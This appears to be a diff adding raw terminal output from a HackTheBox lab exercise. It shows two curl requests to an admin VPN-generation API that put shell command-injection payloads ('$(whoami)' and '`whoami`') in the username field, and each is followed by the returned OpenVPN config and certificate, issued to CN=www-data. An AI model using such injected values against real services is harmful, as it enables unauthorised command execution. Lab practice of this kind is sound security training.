@@ -1,0 +1,188 @@
+➜  ~ curl -X POST 'http://2million.htb/api/v1/admin/vpn/generate' \
+  -b 'PHPSESSID=2sgf4jlk858gcqh89vspfvtdta' \
+  -H 'Content-Type: application/json' \
+  -d '{"username": "$(whoami)"}'
+client
+dev tun
+proto udp
+remote edge-eu-free-1.2million.htb 1337
+resolv-retry infinite
+nobind
+persist-key
+persist-tun
+remote-cert-tls server
+comp-lzo
+verb 3
+data-ciphers-fallback AES-128-CBC
+data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
+tls-cipher "DEFAULT:@SECLEVEL=0"
+auth SHA256
+key-direction 1
+<ca>
+-----BEGIN CERTIFICATE-----
+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
+2iX/ag==
+-----END CERTIFICATE-----
+</ca>
+<cert>
+Certificate:
+    Data:
+        Version: 3 (0x2)
+        Serial Number: 5 (0x5)
+        Signature Algorithm: sha256WithRSAEncryption
+        Issuer: C=UK, ST=London, L=London, O=HackTheBox, OU=VPN, CN=2million/emailAddress=info@hackthebox.eu
+        Validity
+            Not Before: Apr  3 08:18:44 2026 GMT
+            Not After : Apr  3 08:18:44 2027 GMT
+        Subject: C=GB, ST=London, L=London, O=www-data, CN=www-data
+        Subject Public Key Info:
+            Public Key Algorithm: rsaEncryption
+                Public-Key: (2048 bit)
+                Modulus:
+                    00:bf:2f:80:69:8d:eb:96:79:80:76:a9:9f:13:60:
+                    24:0c:fe:95:5e:d7:8f:c4:37:f5:73:56:b0:14:fc:
+                    87:c1:af:2b:96:ba:e2:5d:7b:a3:a0:f9:1c:9c:b7:
+                    aa:2b:27:d7:8d:c4:de:df:e9:01:ca:f9:76:bb:4f:
+                    c7:ca:26:05:5f:6e:7e:95:eb:d3:89:8d:ca:9e:fe:
+                    08:ea:1e:2b:31:63:63:93:87:a5:96:af:0b:f4:8a:
+                    4a:8d:5f:03:5f:55:f5:e6:d8:b1:9a:d7:c3:17:0b:
+                    3d:6d:b2:a4:8d:6a:d5:bf:1f:fb:ae:f0:cf:65:89:
+                    e0:1c:65:65:1d:bb:4d:02:87:c6:32:3f:c2:b4:2e:
+                    ac:15:36:74:24:e9:50:ec:c9:b8:fd:f8:25:7e:51:
+                    2c:8d:5a:23:9c:81:be:a6:2b:25:71:3a:f7:1e:b2:
+                    36:53:c5:0f:91:a3:ed:90:35:1b:c7:4d:a9:43:15:
+                    29:f1:20:67:b9:e3:fe:b7:af:af:5b:f9:72:cf:d3:
+                    dc:cf:1e:d8:e6:62:f3:be:5d:07:ae:43:08:26:bb:
+                    2f:9c:29:ab:ee:5c:3c:66:24:b3:01:fc:1c:11:89:
+                    92:c0:67:7e:17:7f:89:c9:57:4e:2f:c9:d7:77:ba:
+                    61:aa:52:ac:04:fb:21:4f:40:e2:0a:68:3c:50:13:
+                    31:1b
+                Exponent: 65537 (0x10001)
+        X509v3 extensions:
+            X509v3 S
+
+
+➜  ~ curl -X POST 'http://2million.htb/api/v1/admin/vpn/generate' \
+  -b 'PHPSESSID=2sgf4jlk858gcqh89vspfvtdta' \
+  -H 'Content-Type: application/json' \
+  -d '{"username": "`whoami`"}'
+client
+dev tun
+proto udp
+remote edge-eu-free-1.2million.htb 1337
+resolv-retry infinite
+nobind
+persist-key
+persist-tun
+remote-cert-tls server
+comp-lzo
+verb 3
+data-ciphers-fallback AES-128-CBC
+data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
+tls-cipher "DEFAULT:@SECLEVEL=0"
+auth SHA256
+key-direction 1
+<ca>
+-----BEGIN CERTIFICATE-----
+MIIGADCCA+igAwIBAgIUQxzHkNyCAfHzUuoJgKZwCwVNjgIwDQYJKoZIhvcNAQEL
+BQAwgYgxCzAJBgNVBAYTAlVLMQ8wDQYDVQQIDAZMb25kb24xDzANBgNVBAcMBkxv
+bmRvbjETMBEGA1UECgwKSGFja1RoZUJveDEMMAoGA1UECwwDVlBOMREwDwYDVQQD
+DAgybWlsbGlvbjEhMB8GCSqGSIb3DQEJARYSaW5mb0BoYWNrdGhlYm94LmV1MB4X
+DTIzMDUyNjE1MDIzM1oXDTIzMDYyNTE1MDIzM1owgYgxCzAJBgNVBAYTAlVLMQ8w
+DQYDVQQIDAZMb25kb24xDzANBgNVBAcMBkxvbmRvbjETMBEGA1UECgwKSGFja1Ro
+ZUJveDEMMAoGA1UECwwDVlBOMREwDwYDVQQDDAgybWlsbGlvbjEhMB8GCSqGSIb3
+DQEJARYSaW5mb0BoYWNrdGhlYm94LmV1MIICIjANBgkqhkiG9w0BAQEFAAOCAg8A
+MIICCgKCAgEAubFCgYwD7v+eog2KetlST8UGSjt45tKzn9HmQRJeuPYwuuGvDwKS
+JknVtkjFRz8RyXcXZrT4TBGOj5MXefnrFyamLU3hJJySY/zHk5LASoP0Q0cWUX5F
+GFjD/RnehHXTcRMESu0M8N5R6GXWFMSl/OiaNAvuyjezO34nABXQYsqDZNC/Kx10
+XJ4SQREtYcorAxVvC039vOBNBSzAquQopBaCy9X/eH9QUcfPqE8wyjvOvyrRH0Mi
+BXJtZxP35WcsW3gmdsYhvqILPBVfaEZSp0Jl97YN0ea8EExyRa9jdsQ7om3HY7w1
+Q5q3HdyEM5YWBDUh+h6JqNJsMoVwtYfPRdC5+Z/uojC6OIOkd2IZVwzdZyEYJce2
+MIT+8ennvtmJgZBAxIN6NCF/Cquq0ql4aLmo7iST7i8ae8i3u0OyEH5cvGqd54J0
+n+fMPhorjReeD9hrxX4OeIcmQmRBOb4A6LNfY6insXYS101bKzxJrJKoCJBkJdaq
+iHLs5GC+Z0IV7A5bEzPair67MiDjRP3EK6HkyF5FDdtjda5OswoJHIi+s9wubJG7
+qtZvj+D+B76LxNTLUGkY8LtSGNKElkf9fiwNLGVG0rydN9ibIKFOQuc7s7F8Winw
+Sv0EOvh/xkisUhn1dknwt3SPvegc0Iz10//O78MbOS4cFVqRdj2w2jMCAwEAAaNg
+MF4wHQYDVR0OBBYEFHpi3R22/krI4/if+qz0FQyWui6RMB8GA1UdIwQYMBaAFHpi
+3R22/krI4/if+qz0FQyWui6RMA8GA1UdEwEB/wQFMAMBAf8wCwYDVR0PBAQDAgH+
+MA0GCSqGSIb3DQEBCwUAA4ICAQBv+4UixrSkYDMLX3m3Lh1/d1dLpZVDaFuDZTTN
+0tvswhaatTL/SucxoFHpzbz3YrzwHXLABssWko17RgNCk5T0i+5iXKPRG5uUdpbl
+8RzpZKEm5n7kIgC5amStEoFxlC/utqxEFGI/sTx+WrC+OQZ0D9yRkXNGr58vNKwh
+SFd13dJDWVrzrkxXocgg9uWTiVNpd2MLzcrHK93/xIDZ1hrDzHsf9+dsx1PY3UEh
+KkDscM5UUOnGh5ufyAjaRLAVd0/f8ybDU2/GNjTQKY3wunGnBGXgNFT7Dmkk9dWZ
+lm3B3sMoI0jE/24Qiq+GJCK2P1T9GKqLQ3U5WJSSLbh2Sn+6eFVC5wSpHAlp0lZH
+HuO4wH3SvDOKGbUgxTZO4EVcvn7ZSq1VfEDAA70MaQhZzUpe3b5WNuuzw1b+YEsK
+rNfMLQEdGtugMP/mTyAhP/McpdmULIGIxkckfppiVCH+NZbBnLwf/5r8u/3PM2/v
+rNcbDhP3bj7T3htiMLJC1vYpzyLIZIMe5gaiBj38SXklNhbvFqonnoRn+Y6nYGqr
+vLMlFhVCUmrTO/zgqUOp4HTPvnRYVcqtKw3ljZyxJwjyslsHLOgJwGxooiTKwVwF
+pjSzFm5eIlO2rgBUD2YvJJYyKla2n9O/3vvvSAN6n8SNtCgwFRYBM8FJsH8Jap2s
+2iX/ag==
+-----END CERTIFICATE-----
+</ca>
+<cert>
+Certificate:
+    Data:
+        Version: 3 (0x2)
+        Serial Number: 1 (0x1)
+        Signature Algorithm: sha256WithRSAEncryption
+        Issuer: C=UK, ST=London, L=London, O=HackTheBox, OU=VPN, CN=2million/emailAddress=info@hackthebox.eu
+        Validity
+            Not Before: Apr  3 08:21:31 2026 GMT
+            Not After : Apr  3 08:21:31 2027 GMT
+        Subject: C=GB, ST=London, L=London, O=www-data, CN=www-data
+        Subject Public Key Info:
+            Public Key Algorithm: rsaEncryption
+                Public-Key: (2048 bit)
+                Modulus:
+                    00:92:9c:ad:a8:ae:55:6b:87:bd:de:34:f7:44:b5:
+                    a6:d5:ab:02:43:e2:36:ac:ea:66:a4:88:d7:73:b4:
+                    9d:53:fb:f8:d6:fd:de:60:cf:62:25:aa:2f:5a:18:
+                    45:b9:6a:3e:d1:6c:70:11:f2:84:54:79:5f:ea:cc:
+                    68:c4:48:c8:17:fb:df:33:a2:ce:ae:d9:9f:d5:38:
+                    5c:68:04:ae:e6:f0:1b:f2:34:93:ca:8d:10:f5:f5:
+                    26:9f:ce:52:31:71:65:ef:f0:f8:98:fc:4e:0c:ca:
+                    28:4f:0d:c0:c4:c0:4a:1c:ec:0a:fa:3a:a0:ef:1b:
+                    1d:79:b9:cf:91:ec:3f:60:2b:a3:ed:0f:24:ec:b7:
+                    ae:9d:ab:6a:26:00:db:4a:c9:46:c1:a4:6d:48:67:
+                    ed:05:67:e2:36:7e:e4:69:88:0b:e9:01:96:15:71:
+                    0e:29:e0:a6:03:d0:7f:48:a3:bd:75:33:73:b9:f8:
+                    b1:66:9f:eb:89:5f:85:67:ec:aa:85:c3:26:05:41:
+                    48:a5:6a:50:5d:e7:21:6f:ab:38:ac:b7:85:bb:e6:
+                    bd:43:25:a2:0c:76:c9:0f:1d:2f:55:61:2a:7a:f1:
+                    a6:0f:c9:ec:c3:d2:cf:40:59:61:d4:3c:e9:cc:aa:
+                    95:23:46:a5:2d:c6:a9:2f:3b:69:33:79:1e:e9:3b:
+                    d7:09
+                Exponent: 65537 (0x10001)
+        X509v3 extensions:
+            X509v3 S
